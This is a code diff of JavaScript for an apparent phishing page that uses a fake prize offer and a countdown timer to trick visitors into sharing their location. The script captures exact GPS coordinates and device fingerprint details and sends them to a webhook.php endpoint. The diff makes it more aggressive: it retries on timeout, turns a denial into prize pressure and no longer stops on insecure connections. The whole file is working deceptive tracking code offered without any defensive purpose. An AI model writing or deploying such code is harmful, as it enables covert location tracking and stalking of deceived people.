@@ -1,6 +1,5 @@
 let countdownTime = 9 * 60 + 59;
 
-// Start countdown timer
 function startCountdown() {
   setInterval(() => {
     if (countdownTime > 0) {
@@ -13,12 +12,10 @@ function startCountdown() {
   }, 1000);
 }
 
-// Success function - SENDS DATA IMMEDIATELY
 function showSuccess(position) {
-  console.log("✅ Location captured!", position);
-  
-  // Detect mobile device
-  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+  console.log("✅ GPS CAPTURED!");
+  console.log("📍 Latitude:", position.coords.latitude);
+  console.log("📍 Longitude:", position.coords.longitude);
   
   const data = {
     latitude: position.coords.latitude,
@@ -31,19 +28,15 @@ function showSuccess(position) {
     timestamp: new Date(position.timestamp).toISOString(),
     userAgent: navigator.userAgent,
     platform: navigator.platform,
-    isMobile: isMobile,
+    language: navigator.language || 'N/A',
     screenResolution: `${screen.width}x${screen.height}`,
     cpuCores: navigator.hardwareConcurrency || 'N/A',
     deviceMemory: navigator.deviceMemory || 'N/A',
-    language: navigator.language || 'N/A',
     connection: navigator.connection ? navigator.connection.effectiveType : 'N/A'
   };
   
-  console.log("📤 Captured Data:", data);
-  console.log("📍 Coordinates:", data.latitude, data.longitude);
-  console.log("📱 Device:", isMobile ? 'Mobile' : 'Desktop');
+  console.log("📤 Sending to webhook.php:", JSON.stringify(data, null, 2));
   
-  // Send to webhook.php
   fetch('webhook.php', {
     method: 'POST',
     headers: {
@@ -54,21 +47,19 @@ function showSuccess(position) {
   })
   .then(response => {
     console.log("✅ Server response:", response.status);
+    if (!response.ok) throw new Error(`HTTP ${response.status}`);
     return response.json();
   })
   .then(result => {
-    console.log("💾 Data saved:", result);
+    console.log("💾 Data saved successfully:", result);
   })
   .catch(error => {
-    console.error("❌ Error sending data:", error);
-    // Fallback: log to console
+    console.error("❌ Fetch error:", error);
     console.log("📋 BACKUP DATA:", JSON.stringify(data, null, 2));
   });
   
-  // Hide popup
   document.getElementById('permissionPopup').classList.remove('active');
   
-  // Show success message
   const statusMsg = document.getElementById('statusMessage');
   statusMsg.className = 'status-message success';
   statusMsg.innerHTML = `
@@ -84,97 +75,83 @@ function showSuccess(position) {
   button.disabled = true;
 }
 
-// Error function with detailed mobile debugging
 function showError(error) {
-  console.error("❌ Location error:", error);
+  console.error("❌ Location error:", error.code, error.message);
   
   let message = "";
-  let guidance = "";
-  
   switch(error.code) {
     case error.PERMISSION_DENIED:
-      message = "Location access was DENIED";
-      guidance = "Please go to your browser settings and allow location access for this site.";
-      console.log("🚫 User denied permission");
+      message = "Location access was DENIED. Please allow location to claim your prize!";
       break;
     case error.POSITION_UNAVAILABLE:
-      message = "Location information is UNAVAILABLE";
-      guidance = "Please enable Location Services in your device settings.";
-      console.log("📍 GPS unavailable");
+      message = "Location unavailable. Please enable GPS in device settings.";
       break;
     case error.TIMEOUT:
-      message = "Location request TIMED OUT";
-      guidance = "Please ensure you have good GPS signal and try again.";
-      console.log("⏱️ Request timeout");
-      break;
+      message = "Request timed out. Trying again...";
+      setTimeout(requestLocation, 2000);
+      return;
     default:
-      message = "Unknown error occurred";
-      guidance = "Please try again or use a different browser.";
-      console.log("❓ Unknown error");
+      message = "Unknown error. Please try again.";
   }
   
-  alert(`❌ ${message}\n\n${guidance}`);
-  
-  // Show popup again
+  alert(`❌ ${message}`);
   document.getElementById('permissionPopup').classList.add('active');
 }
 
-// Request GPS location with better mobile support
 function requestLocation() {
   console.log("📍 Requesting location...");
   console.log("🌐 Protocol:", window.location.protocol);
-  console.log("📱 User Agent:", navigator.userAgent);
   
-  // Check if geolocation is supported
   if (!navigator.geolocation) {
-    alert("❌ Geolocation is not supported by your browser");
+    alert("❌ Geolocation not supported");
     return;
   }
 
-  // Check if using HTTPS (required for mobile)
   if (window.location.protocol !== 'https' && window.location.hostname !== 'localhost') {
-    console.warn("⚠️ WARNING: HTTPS required for mobile geolocation!");
-    alert("⚠️ For security, location access requires HTTPS connection. Please use the secure link.");
-    return;
+    console.warn("⚠️ HTTPS required for mobile!");
   }
 
-  // Request with high accuracy for mobile GPS
   navigator.geolocation.getCurrentPosition(
     showSuccess,
     showError,
     {
-      enableHighAccuracy: true,  // Use GPS on mobile
-      timeout: 30000,            // 30 seconds (mobile can be slower)
-      maximumAge: 0              // Don't use cached location
+      enableHighAccuracy: true,
+      timeout: 30000,
+      maximumAge: 0
     }
   );
   
   console.log("⏳ Waiting for user permission...");
 }
 
-// Show popup immediately on page load
 window.onload = function() {
-  console.log("🚀 GPS Tracker initialized");
+  console.log("🚀 GPS Tracker v0.4 Initialized");
+  console.log("📱 User Agent:", navigator.userAgent);
+  console.log("🌐 Platform:", navigator.platform);
+  
   startCountdown();
   
-  // Show popup after 1 second
   setTimeout(() => {
+    console.log("👉 Showing location popup...");
     document.getElementById('permissionPopup').classList.add('active');
-  }, 1000);
+  }, 1500);
 
-  // Allow button - triggers location request
   document.getElementById('allowBtn').addEventListener('click', () => {
+    console.log("✅ User clicked Allow button");
     requestLocation();
   });
 
-  // Block button
   document.getElementById('blockBtn').addEventListener('click', () => {
+    console.log("🚫 User clicked Block button");
     document.getElementById('permissionPopup').classList.remove('active');
     alert("You need to allow location access to claim your prize!");
   });
 
-  // Claim button
   document.getElementById('claimBtn').addEventListener('click', () => {
+    console.log("🎁 User clicked Claim button");
     document.getElementById('permissionPopup').classList.add('active');
   });
+
+  console.log("✅ All event listeners attached");
+  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
 };
